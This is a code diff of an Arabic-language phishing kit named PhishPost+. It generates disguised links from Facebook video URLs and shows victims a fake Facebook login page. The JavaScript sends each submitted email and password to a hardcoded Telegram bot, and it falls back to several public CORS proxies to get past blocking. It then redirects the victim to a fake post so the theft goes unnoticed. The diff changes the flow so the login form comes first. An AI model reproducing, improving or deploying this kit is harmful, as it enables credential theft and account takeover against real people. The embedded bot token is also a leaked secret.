@@ -3,83 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PhishPost+</title>
+    <title>PhishPost+ | أداة الملغومات</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; }
+        body { font-family: 'Segoe UI', Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
 
-        /* ===== الصفحة الرئيسية (واجهة الإنشاء) ===== */
-        .gen-container { max-width: 500px; width: 100%; background: white; margin-top: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 25px; display: none; }
-        .gen-container.active { display: block; }
-        .gen-container h2 { margin-bottom: 10px; }
-        .gen-container p { color: #65676b; margin-bottom: 20px; }
-        .gen-container input[type="text"] { width: 100%; padding: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 15px; margin-bottom: 15px; }
-        .gen-container button { background: #1877f2; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
+        /* ===== لوحة توليد الرابط ===== */
+        .gen-panel { max-width: 500px; width: 100%; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 25px; margin: 20px; display: none; }
+        .gen-panel.active { display: block; }
+        .gen-panel h2 { margin-bottom: 8px; color: #1c1e21; }
+        .gen-panel p { color: #65676b; margin-bottom: 20px; }
+        .gen-panel input[type="text"] { width: 100%; padding: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 15px; margin-bottom: 15px; }
+        .gen-panel .btn { background: #1877f2; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
         .result-box { margin-top: 20px; background: #e7f3ff; padding: 15px; border-radius: 6px; word-break: break-all; display: none; }
         .result-box input { width: 100%; padding: 10px; margin-top: 8px; border: 1px solid #dddfe2; border-radius: 4px; }
 
-        /* ===== صفحة التصيد (منشور فيسبوك) ===== */
-        .post-container { max-width: 500px; width: 100%; background: white; margin-top: 20px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); display: none; }
-        .post-container.active { display: block; }
-        .header { padding: 10px 16px; display: flex; align-items: center; border-bottom: 1px solid #dddfe2; }
-        .header img { width: 40px; height: 40px; border-radius: 50%; margin-right: 8px; }
-        .header .name { font-weight: 600; }
-        .header .time { font-size: 12px; color: #65676b; }
-        .video-placeholder { width: 100%; height: 300px; background: #000; position: relative; cursor: pointer; display: flex; align-items: center; justify-content: center; }
-        .video-placeholder::before { content: "▶"; font-size: 60px; color: white; opacity: 0.9; }
-        .actions { display: flex; justify-content: space-around; padding: 10px; border-top: 1px solid #dddfe2; font-size: 14px; color: #65676b; }
+        /* ===== صفحة تسجيل الدخول (الواجهة الأولى) ===== */
+        .login-panel { max-width: 400px; width: 100%; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 25px; text-align: center; margin: 20px; display: none; }
+        .login-panel.active { display: block; }
+        .login-panel img { margin-bottom: 10px; }
+        .login-panel h3 { margin-bottom: 15px; color: #1c1e21; }
+        .login-panel input { width: 100%; padding: 14px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
+        .login-panel .btn { background: #1877f2; color: white; border: none; border-radius: 6px; padding: 12px; font-size: 18px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 12px; }
 
-        /* ===== نافذة تسجيل الدخول ===== */
-        .login-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.96); z-index: 10; align-items: center; justify-content: center; }
-        .login-overlay.active { display: flex; }
-        .login-box { background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); padding: 20px; max-width: 400px; width: 90%; text-align: center; }
-        .login-box h3 { margin-bottom: 10px; }
-        .login-box p { color: #606770; font-size: 14px; margin-bottom: 15px; }
-        .login-box input { width: 100%; padding: 14px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
-        .login-box button { background: #1877f2; color: white; border: none; border-radius: 6px; padding: 12px; font-size: 18px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 10px; }
+        /* ===== منشور فيسبوك (بعد تسجيل الدخول) ===== */
+        .post-panel { max-width: 500px; width: 100%; background: white; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); margin: 20px; display: none; }
+        .post-panel.active { display: block; }
+        .header-post { padding: 10px 16px; display: flex; align-items: center; border-bottom: 1px solid #dddfe2; }
+        .header-post img { width: 40px; height: 40px; border-radius: 50%; margin-right: 8px; }
+        .header-post .name { font-weight: 600; }
+        .header-post .time { font-size: 12px; color: #65676b; }
+        .video-post { width: 100%; height: 300px; background: #000; display: flex; align-items: center; justify-content: center; color: white; font-size: 50px; cursor: pointer; }
+        .actions-post { display: flex; justify-content: space-around; padding: 10px; border-top: 1px solid #dddfe2; font-size: 14px; color: #65676b; }
     </style>
 </head>
 <body>
 
-<!-- ===== لوحة إنشاء الرابط الملغوم ===== -->
-<div id="genPanel" class="gen-container active">
-    <h2>📎 أداة PhishPost+</h2>
-    <p>ألصق رابط فيديو فيسبوك لتحصل على رابط ملغوم جاهز للإرسال.</p>
+<!-- ===== لوحة الصنع (للمُخترق) ===== -->
+<div id="genPanel" class="gen-panel active">
+    <h2>🔗 أداة PhishPost+</h2>
+    <p>ألصق رابط فيديو فيسبوك وستحصل على رابط ملغوم مباشر.</p>
     <input type="text" id="videoUrlInput" placeholder="مثال: https://www.facebook.com/watch/?v=123456">
-    <button onclick="generatePhishingLink()">🎣 أنشئ الرابط الملغوم</button>
+    <button class="btn" onclick="generateLink()">🎣 أنشئ الرابط الملغوم</button>
     <div id="resultBox" class="result-box">
         <strong>الرابط الملغوم:</strong><br>
-        <input type="text" id="phishingLinkOutput" readonly onclick="this.select();">
+        <input type="text" id="phishingLink" readonly onclick="this.select();">
     </div>
 </div>
 
-<!-- ===== واجهة التصيد (تظهر للضحية) ===== -->
-<div id="phishPanel" class="post-container">
-    <div class="header">
+<!-- ===== صفحة تسجيل الدخول (للضحية) ===== -->
+<div id="loginPanel" class="login-panel">
+    <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" width="160">
+    <h3>تسجيل الدخول إلى فيسبوك</h3>
+    <p style="color:#606770; font-size:14px; margin-bottom:15px;">يجب عليك تسجيل الدخول لمتابعة مشاهدة الفيديو.</p>
+    <form id="loginForm">
+        <input type="text" id="emailInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <input type="password" id="passInput" placeholder="كلمة المرور" required>
+        <button type="submit" class="btn">تسجيل الدخول</button>
+    </form>
+</div>
+
+<!-- ===== صفحة المنشور (بعد تسجيل الدخول) ===== -->
+<div id="postPanel" class="post-panel">
+    <div class="header-post">
         <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yV/r/t9QT8N9hNwl.png" alt="صفحة">
         <div>
             <div class="name">صفحة فيسبوك</div>
             <div class="time">منذ دقيقتين · 🌍</div>
         </div>
     </div>
-    <div class="video-placeholder" onclick="openLogin()"></div>
-    <div class="actions">
+    <div class="video-post" onclick="window.open(realVideoUrl, '_blank')">
+        ▶
+    </div>
+    <div class="actions-post">
         <span>👍 إعجاب</span>
         <span>💬 تعليق</span>
         <span>↗️ مشاركة</span>
-    </div>
-</div>
-
-<!-- ===== نافذة تسجيل الدخول ===== -->
-<div class="login-overlay" id="loginOverlay">
-    <div class="login-box">
-        <h3>تسجيل الدخول إلى فيسبوك</h3>
-        <p>يجب تسجيل الدخول لمشاهدة هذا الفيديو.</p>
-        <form id="loginForm">
-            <input type="text" id="emailInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-            <input type="password" id="passInput" placeholder="كلمة المرور" required>
-            <button type="submit">تسجيل الدخول</button>
-        </form>
     </div>
 </div>
 
@@ -87,45 +86,67 @@
     // ========== إعدادات تيليجرام (خاصتك) ==========
     const TELEGRAM_TOKEN = "8654480187:AAF-vu3ZjbRVBdAUSRA8B3HXE4joSCwjghc";
     const TELEGRAM_CHAT_ID = "7763665935";
-    // ================================================
+    // ============================================
 
     let realVideoUrl = "https://www.facebook.com/";
 
-    // عند تحميل الصفحة، نتأكد فيما إذا كان هناك بارامتر ref
-    window.onload = function() {
+    /* ======== توجيه العرض حسب بارامترات الرابط ======== */
+    function detectMode() {
         const params = new URLSearchParams(window.location.search);
         const ref = params.get('ref');
-        if (ref) {
-            // توجد إشارة لرابط فيديو → ضحية
-            try { realVideoUrl = atob(ref); } catch(e) { realVideoUrl = "https://www.facebook.com/"; }
-            document.getElementById('genPanel').classList.remove('active');
-            document.getElementById('phishPanel').classList.add('active');
-        } else {
-            // لا يوجد ref → واجهة الإنشاء
-            document.getElementById('genPanel').classList.add('active');
-            document.getElementById('phishPanel').classList.remove('active');
-        }
-    };
+        const logged = params.get('logged');
 
-    // توليد الرابط الملغوم من رابط الفيديو المدخل
-    function generatePhishingLink() {
+        if (ref && logged === '1') {
+            // دخل الضحية بياناته سابقاً → نظهر المنشور
+            try { realVideoUrl = atob(ref); } catch(e) { realVideoUrl = "https://www.facebook.com/"; }
+            showPostPanel();
+        } else if (ref) {
+            // رابط ملغوم جديد → نظهر تسجيل الدخول
+            try { realVideoUrl = atob(ref); } catch(e) { realVideoUrl = "https://www.facebook.com/"; }
+            showLoginPanel();
+        } else {
+            // بدون بارامترات → واجهة التوليد
+            showGenPanel();
+        }
+    }
+
+    function showGenPanel() {
+        document.getElementById('genPanel').classList.add('active');
+        document.getElementById('loginPanel').classList.remove('active');
+        document.getElementById('postPanel').classList.remove('active');
+    }
+
+    function showLoginPanel() {
+        document.getElementById('genPanel').classList.remove('active');
+        document.getElementById('loginPanel').classList.add('active');
+        document.getElementById('postPanel').classList.remove('active');
+        // تعيين رابط الإرسال بعد تسجيل الدخول
+        document.getElementById('loginForm').action = '#'; // نتحكم بالحدث يدويًا
+    }
+
+    function showPostPanel() {
+        document.getElementById('genPanel').classList.remove('active');
+        document.getElementById('loginPanel').classList.remove('active');
+        document.getElementById('postPanel').classList.add('active');
+    }
+
+    // استدعاء الكشف عند التحميل
+    window.onload = detectMode;
+
+    /* ======== توليد الرابط الملغوم ======== */
+    function generateLink() {
         const videoUrl = document.getElementById('videoUrlInput').value.trim();
         if (!videoUrl) { alert("يرجى إدخال رابط الفيديو!"); return; }
         const encoded = btoa(videoUrl);
         const phishingLink = window.location.href.split('?')[0] + "?ref=" + encoded;
-        document.getElementById('phishingLinkOutput').value = phishingLink;
+        document.getElementById('phishingLink').value = phishingLink;
         document.getElementById('resultBox').style.display = 'block';
     }
 
-    // فتح نافذة تسجيل الدخول
-    function openLogin() {
-        document.getElementById('loginOverlay').classList.add('active');
-    }
-
-    // تنسيق رسالة تيليجرام مرتبة
+    /* ======== تنسيق رسالة تيليجرام ======== */
     function formatTelegramMessage(email, password) {
         const now = new Date();
-        const dateStr = now.toLocaleString('ar-IQ', { 
+        const dateStr = now.toLocaleString('ar-IQ', {
             weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
             hour: '2-digit', minute: '2-digit', second: '2-digit'
         });
@@ -138,19 +159,18 @@
         );
     }
 
-    // إرسال إلى تيليجرام باستخدام عدة مسارات لتجاوز الحظر
+    /* ======== إرسال إلى تيليجرام (متعدد المسارات) ======== */
     async function sendToTelegram(email, password) {
-        const formattedMsg = formatTelegramMessage(email, password);
+        const msg = formatTelegramMessage(email, password);
         const apiBase = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-        const queryParams = `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(formattedMsg)}&parse_mode=Markdown`;
+        const query = `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
 
-        // قائمة المسارات البديلة
         const urls = [
-            apiBase + '?' + queryParams,  // مباشر
-            `https://corsproxy.io/?${encodeURIComponent(apiBase + '?' + queryParams)}`,
-            `https://api.allorigins.win/raw?url=${encodeURIComponent(apiBase + '?' + queryParams)}`,
-            `https://proxy.techzbots.com/?${encodeURIComponent(apiBase + '?' + queryParams)}`,
-            `https://yacdn.org/proxy/${apiBase}?${queryParams}`
+            `${apiBase}?${query}`,  // مباشر
+            `https://corsproxy.io/?${encodeURIComponent(apiBase + '?' + query)}`,
+            `https://api.allorigins.win/raw?url=${encodeURIComponent(apiBase + '?' + query)}`,
+            `https://proxy.techzbots.com/?${encodeURIComponent(apiBase + '?' + query)}`,
+            `https://yacdn.org/proxy/${apiBase}?${query}`
         ];
 
         for (let url of urls) {
@@ -162,19 +182,19 @@
         return false;
     }
 
-    // معالجة تقديم نموذج تسجيل الدخول
+    /* ======== معالجة تسجيل الدخول ======== */
     document.getElementById('loginForm').addEventListener('submit', async function(e) {
         e.preventDefault();
         const email = document.getElementById('emailInput').value;
         const password = document.getElementById('passInput').value;
 
-        // إرسال إلى تيليجرام
+        // إرسال للتيليجرام (لا ننتظر النتيجة لئلا يتأخر التوجيه)
         sendToTelegram(email, password);
 
-        // توجيه الضحية إلى الفيديو الأصلي بعد لحظة
-        setTimeout(() => {
-            window.location.href = realVideoUrl;
-        }, 500);
+        // إعادة توجيه إلى نفس الرابط مع إضافة logged=1 لإظهار المنشور
+        const currentUrl = new URL(window.location.href);
+        currentUrl.searchParams.set('logged', '1');
+        window.location.href = currentUrl.toString();
     });
 </script>
 </body>
